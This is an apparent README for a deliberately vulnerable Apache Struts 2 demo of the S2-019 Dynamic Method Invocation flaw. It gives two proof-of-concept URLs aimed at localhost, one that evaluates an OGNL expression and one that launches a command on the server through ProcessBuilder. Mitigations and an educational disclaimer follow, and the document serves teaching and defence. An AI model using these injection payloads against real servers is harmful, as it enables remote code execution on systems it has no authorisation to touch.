# S2-019 Vulnerability Demonstration

## Overview
This application demonstrates the Apache Struts 2 vulnerability related to **Dynamic Method Invocation (DMI)**. By default, DMI is enabled in Struts 2, allowing attackers to exploit improperly sanitized method calls, leading to potential remote code execution or unauthorized access.

## How the Vulnerability is Exploited

### Proof of Concept (PoC)
1. **Simple Expression Evaluation**:
   - Access the following URL to evaluate an OGNL expression:
     ```
     http://localhost:8080/example/index.action?method:%25{3*4}
     ```
   - This evaluates the OGNL expression `%{3*4}` and returns the result.

2. **Remote Command Execution**:
   - Access the following URL to execute a system command:
     ```
     http://localhost:8080/example/index.action?method:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'calc'})).start()}
     ```
   - This executes the `calc` command on the server.

## Mitigation
To secure the application:

1. **Disable Dynamic Method Invocation**:
   - Set `struts.enable.DynamicMethodInvocation` to `false` in `struts.xml`.

2. **Validate Input**:
   - Ensure all user input is properly validated and sanitized to prevent OGNL injection.

3. **Upgrade Struts**:
   - Use a patched version of Apache Struts 2 where this vulnerability is fixed.

## Disclaimer
This application is for educational purposes only. Exploiting vulnerabilities without proper authorization is illegal and unethical.